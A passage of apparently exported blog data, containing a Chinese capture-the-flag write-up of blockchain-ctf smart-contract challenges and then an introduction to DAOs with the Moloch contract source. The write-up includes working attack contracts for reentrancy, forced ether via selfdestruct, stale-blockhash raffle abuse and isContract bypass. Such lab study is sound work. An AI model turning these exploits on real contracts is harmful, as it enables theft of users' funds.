\"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\n\ncontract Royalties&#123;\n\n    using SafeMath for uint256;\n\n    address private collectionsContract;\n    address private artist;\n\n    address[] private receiver;\n    mapping(address => uint256) private receiverToPercentOfProfit;\n    uint256 private percentRemaining;\n\n    uint256 public amountPaid;\n\n    constructor(address _manager, address _artist) public\n    &#123;\n        collectionsContract = msg.sender;\n        artist=_artist;\n\n        receiver.push(_manager);\n        receiverToPercentOfProfit[_manager] = 80;\n        percentRemaining = 100 - receiverToPercentOfProfit[_manager];\n    &#125;\n\n    modifier isCollectionsContract() &#123; \n        require(msg.sender == collectionsContract, \"Unauthorized: Not Collections Contract\");\n        _;\n    &#125;\n\n    modifier isArtist()&#123;\n        require(msg.sender == artist, \"Unauthorized: Not Artist\");\n        _;\n    &#125;\n\n    function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist&#123;\n        require(_percent&lt;percentRemaining, \"Precent Requested Must Be Less Than Percent Remaining\");\n        receiver.push(_receiver);\n        receiverToPercentOfProfit[_receiver] = _percent;\n        percentRemaining = percentRemaining.sub(_percent);\n    &#125;\n\n    function payoutRoyalties() public payable isCollectionsContract&#123;\n        for (uint256 i = 0; i&lt; receiver.length; i++)&#123;\n            address current = receiver[i];\n            uint256 payout = msg.value.mul(receiverToPercentOfProfit[current]).div(100);\n            amountPaid = amountPaid.add(payout);\n            current.transfer(payout);\n        &#125;\n        msg.sender.call.value(msg.value-amountPaid)(bytes4(keccak256(\"collectRemainingFunds()\")));\n    &#125;\n\n    function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256)&#123;\n        uint256 ret = amountPaid;\n        amountPaid = 0;\n        return ret;\n    &#125;\n\n    function () public payable isCollectionsContract&#123;\n        payoutRoyalties();\n    &#125;\n&#125;\n\ncontract Manager&#123;\n    address public owner;\n\n    constructor(address _owner) public &#123;\n        owner = _owner;\n    &#125;\n\n    function withdraw(uint256 _balance) public &#123;\n        owner.transfer(_balance);\n    &#125;\n\n    function () public payable&#123;\n        // empty\n    &#125;\n&#125;\n\ncontract RecordLabel is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public funds;\n    address public royalties;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        royalties = new Royalties(new Manager(_ctfLauncher), _player);\n        funds = funds.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        funds = funds.add(msg.value);\n    &#125;\n\n\n    function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf&#123;\n        require(_withdrawAmount&lt;=funds, \"Insufficient Funds in Contract\");\n        funds = funds.sub(_withdrawAmount);\n        royalties.call.value(_withdrawAmount)();\n        uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();\n        uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); \n        msg.sender.transfer(artistPayout);\n    &#125;\n\n    function collectRemainingFunds() external payable&#123;\n        require(msg.sender == royalties, \"Unauthorized: Not Royalties Contract\");\n    &#125;\n\n&#125;\n\nAnalyze整体来说就是取款的时候要按百分比分一部分给 Manager 合约\nAttack直接进行调用 withdrawFundsAndPayRoyalties函数，退款金额为1ether，会有80％进入Manager 合约，20%回到自己这里，此时题目合约余额为0，通关\n9.Slot MachineCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract SlotMachine is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public winner;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        winner = 5 ether;\n    &#125;\n    \n    function() external payable ctf&#123;\n        require(msg.value == 1 szabo, \"Incorrect Transaction Value\");\n        if (address(this).balance >= winner)&#123;\n            msg.sender.transfer(address(this).balance);\n        &#125;\n    &#125;\n\n&#125;\n\nAnalyze1szabo等于0.000001ether，进行(5-1.5)&#x2F;0.000001次转账显然不现实，所以可以通过自会合约转入(5-1.5)-0.000001ether，在构建攻击合约转入1szabo即可。\nAttackpragma solidity ^0.5.0;\n\n\ncontract des&#123;\n    constructor()public payable&#123;\n        require(msg.value==3.499999 ether);\n    &#125;\n    function kill(address payable target)public payable&#123;\n        selfdestruct(target);\n    &#125;\n&#125;\ncontract fina&#123;\n    constructor()public payable&#123;\n        require(msg.value==1 szabo);\n    &#125;\n    function trans(address payable target)public payable&#123;\n        target.transfer(address(this).balance);\n    &#125;\n    function kill()public payable&#123;\n        selfdestruct(tx.origin);\n    &#125;\n&#125;\n\n10.Trust FundCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract TrustFund is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public allowancePerYear;\n    uint256 public startDate;\n    uint256 public numberOfWithdrawls;\n    bool public withdrewThisYear;\n    address public custodian;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        custodian = msg.sender;\n        allowancePerYear = msg.value.div(10);        \n        startDate = now;\n    &#125;\n\n    function checkIfYearHasPassed() internal&#123;\n        if (now>=startDate + numberOfWithdrawls * 365 days)&#123;\n            withdrewThisYear = false;\n        &#125; \n    &#125;\n\n    function withdraw() external ctf&#123;\n        require(allowancePerYear > 0, \"No Allowances Allowed\");\n        checkIfYearHasPassed();\n        require(!withdrewThisYear, \"Already Withdrew This Year\");\n        if (msg.sender.call.value(allowancePerYear)())&#123;\n            withdrewThisYear = true;\n            numberOfWithdrawls = numberOfWithdrawls.add(1);\n        &#125;\n    &#125;\n    \n    function returnFunds() external payable ctf&#123;\n        require(msg.value == allowancePerYear, \"Incorrect Transaction Value\");\n        require(withdrewThisYear==true, \"Cannot Return Funds Before Withdraw\");\n        withdrewThisYear = false;\n        numberOfWithdrawls=numberOfWithdrawls.sub(1);\n    &#125;\n&#125;\n\nAnalyze挺明显的重入漏洞，if判断哪里进行了call转账，主要就是攻击合约的fallback函数构造，总共执行10次withdraw()函数即可\nAttackpragma solidity ^0.6.0;\ninterface TrustFund&#123;\n    function withdraw() external;\n    function ctf_challenge_add_authorized_sender(address _addr) external;\n    function returnFunds() external;\n&#125;\ncontract attack&#123;\n    TrustFund target=TrustFund(0xdCe036d62FCAE1593195aba30B9629E49749f3c0);\n    uint public i=1;\n    function add(address addr)public &#123;\n        target.ctf_challenge_add_authorized_sender(addr);\n    &#125;\n    function pwn() public payable &#123;\n        target.withdraw();\n    &#125;\n    fallback() external payable&#123;\n        if(i&lt;=9)&#123;\n        target.withdraw();\n        i++;\n        &#125;\n    &#125;\n    function kill(address payable acct)public payable&#123;\n        selfdestruct(acct);\n    &#125;\n&#125;\n\n\n11.Rainy Day FundCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract DebugAuthorizer&#123;\n    \n    bool public debugMode;\n\n    constructor() public payable&#123;\n        if(address(this).balance == 1.337 ether)&#123;\n            debugMode=true;\n        &#125;\n    &#125;\n&#125;\n\ncontract RainyDayFund is CtfFramework&#123;\n\n    address public developer;\n    mapping(address=>bool) public fundManagerEnabled;\n    DebugAuthorizer public debugAuthorizer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development\n        debugAuthorizer = new DebugAuthorizer();\n        developer = msg.sender;\n        fundManagerEnabled[msg.sender] = true;\n    &#125;\n    \n    modifier isManager() &#123;\n        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, \"Unauthorized: Not a Fund Manager\");\n         _;\n    &#125;\n\n    function () external payable ctf&#123;\n        // Anyone can add to the fund    \n    &#125;\n    \n    function addFundManager(address _newManager) external isManager ctf&#123;\n        fundManagerEnabled[_newManager] = true;\n    &#125;\n\n    function removeFundManager(address _previousManager) external isManager ctf&#123;\n        fundManagerEnabled[_previousManager] = false;\n    &#125;\n\n    function withdraw() external isManager ctf&#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\nAnalyze主要考查了create算法，提前预计所创建合约的地址，详见我的一篇博客，讲的挺详细，这里就不再赘述了根据两道题目理解create及create2算法\nAttack\n得到地址后提转入1.337eth即可\n12.RaffleCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Raffle is CtfFramework&#123;\n\n    uint256 constant fee = 0.1 ether;\n\n    address private admin;\n\n    bytes4 private winningTicket;\n    uint256 private blocknum;\n\n    uint256 public ticketsBought;\n    bool public raffleStopped;\n\n    mapping(address=>uint256) private rewards;\n    mapping(address=>bool) private potentialWinner;\n    mapping(address=>bytes4) private ticketNumbers;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        rewards[address(this)] = msg.value;\n        admin = msg.sender;\n    &#125;\n\n    function buyTicket() external payable ctf&#123;\n        if(msg.value >= fee)&#123;\n            winningTicket = bytes4(0);\n            blocknum = block.number+1;\n            ticketsBought += 1;\n            raffleStopped = false;\n            rewards[msg.sender] += msg.value;\n            ticketNumbers[msg.sender] = bytes4((msg.value - fee)/10**8);\n            potentialWinner[msg.sender] = true;\n        &#125;\n    &#125;\n\n    function closeRaffle() external ctf&#123;\n        require(ticketsBought>0);\n        require(!raffleStopped);\n        require(blocknum != 0);\n        require(winningTicket == bytes4(0));\n        require(block.number>blocknum);\n        require(msg.sender==admin || rewards[msg.sender]>0);\n        winningTicket = bytes4(blockhash(blocknum));\n        potentialWinner[msg.sender] = false;\n        raffleStopped = true;\n    &#125;\n\n    function collectReward() external payable ctf&#123;\n        require(raffleStopped);\n        require(potentialWinner[msg.sender]);\n        rewards[address(this)] += msg.value;\n        if(winningTicket == ticketNumbers[msg.sender])&#123;\n            msg.sender.transfer(rewards[msg.sender]);\n            msg.sender.transfer(rewards[address(this)]); \n            rewards[msg.sender] = 0;\n            rewards[address(this)] = 0;\n        &#125;\n    &#125;\n\n    function skimALittleOffTheTop(uint256 _value) external ctf&#123;\n        require(msg.sender==admin);\n        require(rewards[address(this)]>_value);\n        rewards[address(this)] = rewards[address(this)] - _value;\n        msg.sender.transfer(_value);\n    &#125;\n\n    function () public payable ctf&#123;\n        if(msg.value>=fee)&#123;\n            this.buyTicket();\n        &#125;\n        else if(msg.value == 0)&#123;\n            this.closeRaffle();\n        &#125;\n        else&#123;\n            this.collectReward();\n        &#125;\n    &#125;\n\n&#125;\n\nAnalyze也是关于随机数的问题，blockhash只能读取到最近的256个区块，超过了就会返回值0，所以ticketNumbers[msg.sender]可以通过msg.value来控制其值为0，需要两个合约一个用来改变raffleStopped，一个用来改变potentialWinner[msg.sender]，然后等待256个区块过后调用collectReward()即可通关\nAttackcontract attack1&#123;\n     Raffle target=Raffle(0xf49481a5110f9910cfca57f855bc6eefd8465c5c);\n     constructor()public payable&#123;\n        require(msg.value==0.1 ether);\n    &#125;\n    function buy()public payable&#123;\n        target.buyTicket.value(0.1 ether)();\n    &#125;\n    function pwn()public&#123;\n        target.collectReward();\n    &#125;\n    function() external payable&#123;&#125;\n    function kill()public payable&#123;\n        selfdestruct(tx.origin);\n    &#125;\n&#125;\ncontract attack2&#123;\n    Raffle target=Raffle(0xf49481a5110f9910cfca57f855bc6eefd8465c5c);\n    constructor()public payable&#123;\n        require(msg.value==0.1 ether);\n    &#125;\n    function makeraffleStoppedtruefirststep()public payable&#123;\n        target.buyTicket.value(0.1 ether)();\n    &#125;\n    function makeraffleStoppedtrue()public&#123;\n        target.closeRaffle();\n    &#125; \n&#125;\n\n先执行attack1使potentialWinner[msg.sender]为true，在执行attack2使 blocknum为当前区块等待256区块之后调用makeraffleStoppedtrue()使raffleStopped为true，再调用pwn即可获得目标合约中的全部余额。\n13.ScratchcardCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\nlibrary Address &#123;\n    function isContract(address account) internal view returns (bool) &#123;\n        uint256 size;\n        assembly &#123; size := extcodesize(account) &#125;\n        return size > 0;\n    &#125;\n&#125;\n\ncontract Scratchcard is CtfFramework&#123;\n\n    event CardPurchased(address indexed player, uint256 cost, bool winner);\n\n    mapping(address=>uint256) private winCount;\n    uint256 private cost;\n\n\n    using Address for address;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n    &#125;\n\n    modifier notContract()&#123;\n        require(!msg.sender.isContract(), \"Contracts Not Allowed\");\n        _;\n    &#125;\n    \n    function play() public payable notContract ctf&#123;\n        bool won = false;\n        if((now%10**8)*10**10 == msg.value)&#123;\n            won = true;\n            winCount[msg.sender] += 1;\n            cost = msg.value;\n            msg.sender.transfer(cost);\n        &#125;\n        else&#123;\n            cost = 0;\n            winCount[msg.sender] = 0;\n        &#125;\n        emit CardPurchased(msg.sender, msg.value, won);\n    &#125;    \n\n    function checkIfMegaJackpotWinner() public view returns(bool)&#123;\n        return(winCount[msg.sender]>=25);\n    &#125;\n\n    function collectMegaJackpot(uint256 _amount) public notContract ctf&#123;\n        require(checkIfMegaJackpotWinner(), \"User Not Winner\");\n        require(2 * cost - _amount > 0, \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\");\n        winCount[msg.sender] = 0;\n        msg.sender.transfer(_amount);\n    &#125;\n\n    function () public payable ctf&#123;\n        play();\n    &#125;\n\n&#125;\n\nAnalyze主要考查了isContract绕过，地址类型分为两种，一种是账户地址codesize为0，另一种是合约地址codesize大于0。\n由于isContract限制，这道题看起来是只能由human进行攻击，然而不是，合约在构造时codesize为0，所以在攻击合约的constructor中可以对题目合约进行调用\n题目还涉及到一点就是create算法，详见我的另一篇博客根据两道题目理解create及create2算法\n提前将未部署的合约地址添加到CtfFramework中，在设置金额直接部署即可晚场攻击\nAttack合约地址计算\ndef getnonce(addr):\n    return w3.eth.getTransactionCount(Web3.toChecksumAddress(hex(addr)))\ndef getaddress(sender,nonce):\n    return (Web3.sha3(rlp.encode([sender, nonce]))[12:].hex())\n\naddr=0x2b2E23ceC9921288f63F60A839E2B28235bc22ad\nnonce=getnonce(addr)\nprint(nonce)\ngetcontractaddress=getaddress(addr,nonce)\nprint(getcontractaddress)\n\n值得注意的一点是，在 ctf_challenge_add_authorized_sender后计算，否则调用后nonce会变化\ncontract attack&#123;\n    Scratchcard target=Scratchcard(0xc239f15e5f37e29b26d92786b005c124ae629c1f);\n    uint public a;\n    uint public i=1;\n    constructor()public payable&#123;\n        require(msg.value==3 ether);\n        a=(now%10**8)*10**10;\n        for(i;i&lt;=25;i++)\n        target.play.value(a*1 wei)();\n        target.collectMegaJackpot(3.5 ether);\n    &#125;\n    function() public payable&#123;\n    &#125;\n     function get() public view returns(uint)&#123;\n        return address(this).balance;\n    &#125;\n    function kill()public payable&#123;\n        selfdestruct(tx.origin);\n    &#125;\n&#125;\n\n\nSummary至此blockchain-ctf靶场所有题目均已解出，总体来说难度循序渐进，还是学到了很多新东西的，比如说create算法之类的，同时也巩固了很多之前学过的东西，像重入漏洞等等等等，都再次加深了印象！\n","slug":"blockchain-ctf","date":"2022-08-01T10:35:33.060Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"9577d25fd5332f28e4fb9b967ac228a0","title":"Understanding DAO with an example","content":"IntroWhat is DAO？DAO的英文全称为Decentralized A utonomous O rganization，常见的中文翻译为去中心化自治组织（社区），是一种以公开透明的计算机代码来体现的组织，其受控于股东，并不受中央政府影响。一个分布式自治组织的金融交易记录和程序规则是保存在区块链中的。目前分布式自治组织确切的法律地位还不清楚。\nWhy DAO？DAO的优点1、消除营私舞弊：DAO的资金都是按照公开透明的方式获得以及使用的，每一笔资金的来源与去向都十分清晰，不存在地下交易。 2、降低沟通成本：执行某一个决策没有商量的余地，只需要根据合约和投票得出的提案运行即可。 3、降低管理成本：DAO没有层级结构，没有CEO，没有经理，不需要付出管理成本。 4、平等：DAO没有层级结构，所有人都是平等的。 5、没有独裁：所有人都可以为组织提出方案并可能被使用。 6、团结：所有的参与者都持有DAO的通证，DAO运行得越好，通证就会越有价值。所有参与者会有相同的目标，即让DAO更好地运行。同时，提出提案以及投票都需要消耗一定量的通证。因此，投票人都会从DAO的角度出发，真心真意为DAO谋福利。\nDAO组织的性质特点1、分布式与去中心化：DAO 中不存在中心节点以及层级化的管理架构，它通过自下而上的网络节点之间的交互、竞争与协作来实现组织目标。因此，DAO中节点与节点之间、节点与组织之间的业务往来不再由行政隶属关系所决定，而是遵循平等、自愿、互惠、互利的原则，由彼此的资源禀赋、互补优势和利益共赢所驱动。每个组织节点都将根据自己的资源优势和才能资质，在通证的激励机制的作用下有效协作，从而产生强大的协同效应。 2、自主性与自动化：在一个理想状态的 DAO中，管理是代码化、程序化且自动化的。“代码即法律”，组织不再是金字塔式而是分布式，权力不再是中心化而是去中心化，管理不再是科层制而是社区自治，组织运行不再需要公司而是由高度自治的社区所替代。此外，由于 DAO运行在由利益相关者共同确定的运行标准和协作模式下，组织内部的共识和信任更易达成， 可以最大限度地降低组织的信任成本、沟通成本和交易成本。 3、组织化与有序性：依赖于智能合约，DAO中的运转规则、参与者的职责权利以及奖惩机制等均公开透明。此外，通过一系列高效的自治原则，相关参与者的权益得到精准分化与降维，即给那些付出劳动、做出贡献、承担责任的个体匹配相应的权利和收益，以促进产业分工以及权利、责任、利益均等，使得组织运转更加协调、有序。 4、智能化与通证化 ：DAO底层以封装了支持DAO（及其衍生应用的所有基础设施——互联网基础协议、区块链技术、人工智能、大数据、物联网等为技术支撑，以数字化、智能化、链上链下协同治理为治理手段，改变了传统的科层制以及人为式管理方式，实现了组织的智能化管理。通证（token）作为DAO（岛）治理过程中的重要激励手段，将组织中的各个元素（例如人、组织、知识、事件、产品等）数字化、通证化，从而使得货币资本、人力资本以及其他要素资本充分融合，更好地激发组织的效能和实现价值流转。\nDAO的优势1、快速、无边界的业务决策：如果在A国的某人想跟B国、C国等国家的创始人一起创业，当前做个事情的过程非常复杂。不同的司法管辖区有不同的要求。决策所需的时间范围也有所不同。例如，假设A国的某人只需一天即可正式成立业务，而在B国的那位需要3个月时间来启动。显然，在B国的人并不拥有跟A国的那位一样的资源。 DAO则提供了一种解决方案，可以通过遵守一套标准规则，让每个人都可以在同等条件下工作，而不用考虑所在的地理位置。本质上说，创建DAO的一个主要原因之一是为组织的成立和运营提供平等的体系。 2、组织范围内的投票：很多公司都有董事会来做重要决策。这么做的问题是这些组织通常只对少数选出的问题进行投票，且并不一定代表组织的大多数。DAO可以改变这一点，它允许组织的任何人都可以就他们关心的问题进行投票。例如，A可能会关心问题A和问题C，但不怎么关心问题B。 通过DAO，A可以根据自己关心的程度来对提案进行相应比例的代币投票。DAO（岛）不会使用对组织内成员的输入忽略或不加计入的系统，而是确保所有投票都被统计并向所有人显示。 3、无法篡改规则：在任何组织内，政策和规则决定什么能做以及什么不能做。例如，在一家公司，不遵守规定的员工可能会遭受惩罚。如果某人上班迟到，这可能会也可能不会导致相应地扣减工资。这个决定可以通过时间戳来自动执行，但并非所有组织都会强制执行。 会议是形成想法和讨论想法的机会。DAO可以让远程组织更容易评估成员兴趣，更容易让想法从构想变为现实。\nps:Why is DAO 处内容来自:为什么DAO会成为资本市场的新战场？DAO的未来怎么样？\nExampleCode/**\n *Submitted for verification at Etherscan.io on 2019-02-18\n*/\n\npragma solidity ^0.5.3;\n\ncontract Moloch &#123;\n    using SafeMath for uint256;\n\n    /***************\n    GLOBAL CONSTANTS\n    ***************/\n    uint256 public periodDuration; // default = 17280 = 4.8 hours in seconds (5 periods per day)\n    uint256 public votingPeriodLength; // default = 35 periods (7 days)\n    uint256 public gracePeriodLength; // default = 35 periods (7 days)\n    uint256 public abortWindow; // default = 5 periods (1 day)\n    uint256 public proposalDeposit; // default = 10 ETH (~$1,000 worth of ETH at contract deployment)\n    uint256 public dilutionBound; // default = 3 - maximum multiplier a YES voter will be obligated to pay in case of mass ragequit\n    uint256 public processingReward; // default = 0.1 - amount of ETH to give to whoever processes a proposal\n    uint256 public summoningTime; // needed to determine the current period\n\n    IERC20 public approvedToken; // approved token contract reference; default = wETH\n    GuildBank public guildBank; // guild bank contract reference\n\n    // HARD-CODED LIMITS\n    // These numbers are quite arbitrary; they are small enough to avoid overflows when doing calculations\n    // with periods or shares, yet big enough to not limit reasonable use cases.\n    uint256 constant MAX_VOTING_PERIOD_LENGTH = 10**18; // maximum length of voting period\n    uint256 constant MAX_GRACE_PERIOD_LENGTH = 10**18; // maximum length of grace period\n    uint256 constant MAX_DILUTION_BOUND = 10**18; // maximum dilution bound\n    uint256 constant MAX_NUMBER_OF_SHARES = 10**18; // maximum number of shares that can be minted\n\n    /***************\n    EVENTS\n    ***************/\n    event SubmitProposal(uint256 proposalIndex, address indexed delegateKey, address indexed memberAddress, address indexed applicant, uint256 tokenTribute, uint256 sharesRequested);\n    event SubmitVote(uint256 indexed proposalIndex, address indexed delegateKey, address indexed memberAddress, uint8 uintVote);\n    event ProcessProposal(uint256 indexed proposalIndex, address indexed applicant, address indexed memberAddress, uint256 tokenTribute, uint256 sharesRequested, bool didPass);\n    event Ragequit(address indexed memberAddress, uint256 sharesToBurn);\n    event Abort(uint256 indexed proposalIndex, address applicantAddress);\n    event UpdateDelegateKey(address indexed memberAddress, address newDelegateKey);\n    event SummonComplete(address indexed summoner, uint256 shares);\n\n    /******************\n    INTERNAL ACCOUNTING\n    ******************/\n    uint256 public totalShares = 0; // total shares across all members\n    uint256 public totalSharesRequested = 0; // total shares that have been requested in unprocessed proposals\n\n    enum Vote &#123;\n        Null, // default value, counted as abstention\n        Yes,\n        No\n    &#125;\n\n    struct Member &#123;\n        address delegateKey; // the key responsible for submitting proposals and voting - defaults to member address unless updated\n        uint256 shares; // the # of shares assigned to this member\n        bool exists; // always true once a member has been created\n        uint256 highestIndexYesVote; // highest proposal index # on which the member voted YES\n    &#125;\n\n    struct Proposal &#123;\n        address proposer; // the member who submitted the proposal\n        address applicant; // the applicant who wishes to become a member - this key will be used for withdrawals\n        uint256 sharesRequested; // the # of shares the applicant is requesting\n        uint256 startingPeriod; // the period in which voting can start for this proposal\n        uint256 yesVotes; // the total number of YES votes for this proposal\n        uint256 noVotes; // the total number of NO votes for this proposal\n        bool processed; // true only if the proposal has been processed\n        bool didPass; // true only if the proposal passed\n        bool aborted; // true only if applicant calls \"abort\" fn before end of voting period\n        uint256 tokenTribute; // amount of tokens offered as tribute\n        string details; // proposal details - could be IPFS hash, plaintext, or JSON\n        uint256 maxTotalSharesAtYesVote; // the maximum # of total shares encountered at a yes vote on this proposal\n        mapping (address => Vote) votesByMember; // the votes on this proposal by each member\n    &#125;\n\n    mapping (address => Member) public members;\n    mapping (address => address) public memberAddressByDelegateKey;\n    Proposal[] public proposalQueue;\n\n    /********\n    MODIFIERS\n    ********/\n    modifier onlyMember &#123;\n        require(members[msg.sender].shares > 0, \"Moloch::onlyMember - not a member\");\n        _;\n    &#125;\n\n    modifier onlyDelegate &#123;\n        require(members[memberAddressByDelegateKey[msg.sender]].shares > 0, \"Moloch::onlyDelegate - not a delegate\");\n        _;\n    &#125;\n\n    /********\n    FUNCTIONS\n    ********/\n    constructor(\n        address summoner,\n        address _approvedToken,\n        uint256 _periodDuration,\n        uint256 _votingPeriodLength,\n        uint256 _gracePeriodLength,\n        uint256 _abortWindow,\n        uint256 _proposalDeposit,\n        uint256 _dilutionBound,\n        uint256 _processingReward\n    ) public &#123;\n        require(summoner != address(0), \"Moloch::constructor - summoner cannot be 0\");\n        require(_approvedToken != address(0), \"Moloch::constructor - _approvedToken cannot be 0\");\n        require(_periodDuration > 0, \"Moloch::constructor - _periodDuration cannot be 0\");\n        require(_votingPeriodLength > 0, \"Moloch::constructor - _votingPeriodLength cannot be 0\");\n        require(_votingPeriodLength &lt;= MAX_VOTING_PERIOD_LENGTH, \"Moloch::constructor - _votingPeriodLength exceeds limit\");\n        require(_gracePeriodLength &lt;= MAX_GRACE_PERIOD_LENGTH, \"Moloch::constructor - _gracePeriodLength exceeds limit\");\n        require(_abortWindow > 0, \"Moloch::constructor - _abortWindow cannot be 0\");\n        require(_abortWindow &lt;= _votingPeriodLength, \"Moloch::constructor - _abortWindow must be smaller than or equal to _votingPeriodLength\");\n        require(_dilutionBound > 0, \"Moloch::constructor - _dilutionBound cannot be 0\");\n        require(_dilutionBound &lt;= MAX_DILUTION_BOUND, \"Moloch::constructor - _dilutionBound exceeds limit\");\n        require(_proposalDeposit >= _processingReward, \"Moloch::constructor - _proposalDeposit cannot be smaller than _processingReward\");\n\n        approvedToken = IERC20(_approvedToken);\n\n        guildBank = new GuildBank(_approvedToken);\n\n        periodDuration = _periodDuration;\n        votingPeriodLength = _votingPeriodLength;\n        gracePeriodLength = _gracePeriodLength;\n        abortWindow = _abortWindow;\n        proposalDeposit = _proposalDeposit;\n        dilutionBound = _dilutionBound;\n        processingReward = _processingReward;\n\n        summoningTime = now;\n\n        members[summoner] = Member(summoner, 1, true, 0);\n        memberAddressByDelegateKey[summoner] = summoner;\n        totalShares = 1;\n\n        emit SummonComplete(summoner, 1);\n    &#125;\n\n    /*****************\n    PROPOSAL FUNCTIONS\n    *****************/\n\n    function submitProposal(\n        address applicant,\n        uint256 tokenTribute,\n        uint256 sharesRequested,\n        string memory details\n    )\n        public\n        onlyDelegate\n    &#123;\n        require(applicant != address(0), \"Moloch::submitProposal - applicant cannot be 0\");\n\n        // Make sure we won't run into overflows when doing calculations with shares.\n        // Note that totalShares + totalSharesRequested + sharesRequested is an upper bound\n        // on the number of shares that can exist until this proposal has been processed.\n        require(totalShares.add(totalSharesRequested).add(sharesRequested) &lt;= MAX_NUMBER_OF_SHARES, \"Moloch::submitProposal - too many shares requested\");\n\n        totalSharesRequested = totalSharesRequested.add(sharesRequested);\n\n        address memberAddress = memberAddressByDelegateKey[msg.sender];\n\n        // collect proposal deposit from proposer and store it in the Moloch until the proposal is processed\n        require(approvedToken.transferFrom(msg.sender, address(this), proposalDeposit), \"Moloch::submitProposal - proposal deposit token transfer failed\");\n\n        // collect tribute from applicant and store it in the Moloch until the proposal is processed\n        require(approvedToken.transferFrom(applicant, address(this), tokenTribute), \"Moloch::submitProposal - tribute token transfer failed\");\n\n        // compute startingPeriod for proposal\n        uint256 startingPeriod = max(\n            getCurrentPeriod(),\n            proposalQueue.length == 0 ? 0 : proposalQueue[proposalQueue.length.sub(1)].startingPeriod\n        ).add(1);\n\n        // create proposal ...\n        Proposal memory proposal = Proposal(&#123;\n            proposer: memberAddress,\n            applicant: applicant,\n            sharesRequested: sharesRequested,\n            startingPeriod: startingPeriod,\n            yesVotes: 0,\n            noVotes: 0,\n            processed: false,\n            didPass: false,\n            aborted: false,\n            tokenTribute: tokenTribute,\n            details: details,\n            maxTotalSharesAtYesVote: 0\n        &#125;);\n\n        // ... and append it to the queue\n        proposalQueue.push(proposal);\n\n        uint256 proposalIndex = proposalQueue.length.sub(1);\n        emit SubmitProposal(proposalIndex, msg.sender, memberAddress, applicant, tokenTribute, sharesRequested);\n    &#125;\n\n    function submitVote(uint256 proposalIndex, uint8 uintVote) public onlyDelegate &#123;\n        address memberAddress = memberAddressByDelegateKey[msg.sender];\n        Member storage member = members[memberAddress];\n\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::submitVote - proposal does not exist\");\n        Proposal storage proposal = proposalQueue[proposalIndex];\n\n        require(uintVote &lt; 3, \"Moloch::submitVote - uintVote must be less than 3\");\n        Vote vote = Vote(uintVote);\n\n        require(getCurrentPeriod() >= proposal.startingPeriod, \"Moloch::submitVote - voting period has not started\");\n        require(!hasVotingPeriodExpired(proposal.startingPeriod), \"Moloch::submitVote - proposal voting period has expired\");\n        require(proposal.votesByMember[memberAddress] == Vote.Null, \"Moloch::submitVote - member has already voted on this proposal\");\n        require(vote == Vote.Yes || vote == Vote.No, \"Moloch::submitVote - vote must be either Yes or No\");\n        require(!proposal.aborted, \"Moloch::submitVote - proposal has been aborted\");\n\n        // store vote\n        proposal.votesByMember[memberAddress] = vote;\n\n        // count vote\n        if (vote == Vote.Yes) &#123;\n            proposal.yesVotes = proposal.yesVotes.add(member.shares);\n\n            // set highest index (latest) yes vote - must be processed for member to ragequit\n            if (proposalIndex > member.highestIndexYesVote) &#123;\n                member.highestIndexYesVote = proposalIndex;\n            &#125;\n\n            // set maximum of total shares encountered at a yes vote - used to bound dilution for yes voters\n            if (totalShares > proposal.maxTotalSharesAtYesVote) &#123;\n                proposal.maxTotalSharesAtYesVote = totalShares;\n            &#125;\n\n        &#125; else if (vote == Vote.No) &#123;\n            proposal.noVotes = proposal.noVotes.add(member.shares);\n        &#125;\n\n        emit SubmitVote(proposalIndex, msg.sender, memberAddress, uintVote);\n    &#125;\n\n    function processProposal(uint256 proposalIndex) public &#123;\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::processProposal - proposal does not exist\");\n        Proposal storage proposal = proposalQueue[proposalIndex];\n        require(getCurrentPeriod() >= proposal.startingPeriod.add(votingPeriodLength).add(gracePeriodLength), \"Moloch::processProposal - proposal is not ready to be processed\");\n        require(proposal.processed == false, \"Moloch::processProposal - proposal has already been processed\");\n        require(proposalIndex == 0 || proposalQueue[proposalIndex.sub(1)].processed, \"Moloch::processProposal - previous proposal must be processed\");\n        proposal.processed = true;\n        totalSharesRequested = totalSharesRequested.sub(proposal.sharesRequested);\n        bool didPass = proposal.yesVotes > proposal.noVotes;\n        // Make the proposal fail if the dilutionBound is exceeded\n        if (totalShares.mul(dilutionBound) &lt; 